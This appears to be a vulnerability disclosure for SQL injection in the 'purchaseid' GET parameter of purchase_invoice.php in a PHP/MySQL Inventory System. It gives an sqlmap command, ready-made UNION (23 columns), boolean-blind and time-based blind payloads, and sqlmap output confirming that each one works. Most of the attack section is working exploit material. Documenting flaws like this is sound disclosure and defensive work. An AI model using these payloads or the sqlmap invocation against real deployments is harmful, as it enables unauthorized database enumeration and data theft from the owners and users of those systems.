# SQL Injection in Inventory System (Purchase Invoice)

## Overview

* **Vulnerability Type**: SQL Injection (UNION-based / Blind)
* **Product**: [Inventory System](https://www.sourcecodester.com/php/7760/inventory-system-php-and-mysql.html)
* **Version**: 1.0
* **Component**: Purchase Invoice (`purchase_invoice.php`)
* **Vulnerable Parameter**: `purchaseid` (GET)

## Description

A SQL Injection vulnerability exists in the **Inventory System**. The vulnerability is located in the `purchase_invoice.php` file.

The application fails to properly sanitize the `purchaseid` parameter in the HTTP GET request. This allows an authenticated attacker to inject arbitrary SQL commands. Since the backend database is **MySQL** and the injection point allows for **UNION queries** (23 columns), attackers can directly retrieve and display sensitive data from the database, in addition to using blind injection techniques.

## Steps to Reproduce

1. **Setup**: Deploy the Inventory System locally.
2. **Login**: Log in to the application.
3. **Exploit**: Send a crafted HTTP GET request to `purchase_invoice.php` injecting SQL into the `purchaseid` parameter, or use `sqlmap`.

**SQLMap Command:**

```bash
sqlmap -u "http://127.0.0.1:8089/purchase_invoice.php?purchaseid=PR3" \
--batch -v 6 --risk=3 \
--cookie "PHPSESSID=YOUR_COOKIE_HERE"

```

## PoC Payload

**UNION Query Payload (MySQL):**

```sql
purchaseid=PR3' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162787171,0x68595375656a48764e49416542676f73764647584277616849704858684e4e76494e4a71726f6357,0x71786b6a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -

```

**Boolean-based Blind Payload:**

```sql
purchaseid=PR3' AND 8776=8776 AND 'AuSo'='AuSo

```

**Time-based Blind Payload:**

```sql
purchaseid=PR3' AND (SELECT 9448 FROM (SELECT(SLEEP(5)))wjTm) AND 'yFph'='yFph

```

## Proof of Concept

The following output from `sqlmap` confirms that the `purchaseid` parameter is vulnerable to UNION-based, Boolean-based, and Time-based SQL injection.

```text
Parameter: purchaseid (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: purchaseid=PR3' AND 8776=8776 AND 'AuSo'='AuSo
    Vector: AND [INFERENCE]

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: purchaseid=PR3' AND (SELECT 9448 FROM (SELECT(SLEEP(5)))wjTm) AND 'yFph'='yFph
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])

    Type: UNION query
    Title: Generic UNION query (NULL) - 23 columns
    Payload: purchaseid=PR3' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162787171,0x68595375656a48764e49416542676f73764647584277616849704858684e4e76494e4a71726f6357,0x71786b6a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
---
[INFO] the back-end DBMS is MySQL

```
<img width="1051" height="364" alt="图片" src="https://github.com/user-attachments/assets/90aceab1-f66c-422c-8cc8-96b9d28a4d63" />
<img width="860" height="466" alt="图片" src="https://github.com/user-attachments/assets/90a55ef9-6bc7-4e85-a3f5-51a794ce4df8" />


## Impact

This vulnerability allows an attacker to:

1. **Exfiltrate Data**: Directly retrieve and display database content via UNION-based attacks.
2. **Database Enumeration**: Identify tables, columns, and database schema.

## Reference

* [Project Source Code](https://www.sourcecodester.com/php/7760/inventory-system-php-and-mysql.html)
